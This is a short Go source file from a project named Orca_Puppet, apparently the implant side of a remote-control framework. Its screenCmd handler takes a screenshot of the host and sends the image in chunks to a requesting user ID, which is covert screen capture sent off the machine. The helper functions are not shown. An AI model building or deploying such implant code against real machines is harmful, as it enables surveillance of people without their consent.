package controller

import (
	"Orca_Puppet/cli/cmdopt/screenopt"
	"Orca_Puppet/define/debug"
	"Orca_Puppet/define/retcode"
)

func screenCmd(sendUserId string) {
	imgData, err := screenopt.TakeScreenshotData()
	if err != nil {
		debug.DebugPrint("take screenshot failed")
		return
	}
	metaInfoMsg := screenopt.GetScreenMetaInfo(imgData)
	retData := screenopt.SendScreenMetaMsg(sendUserId, metaInfoMsg)
	if retData.Code != retcode.SUCCESS {
		debug.DebugPrint("send failed")
		return
	}
	// 分片发送文件
	screenopt.SendScreenData(sendUserId, imgData)
}
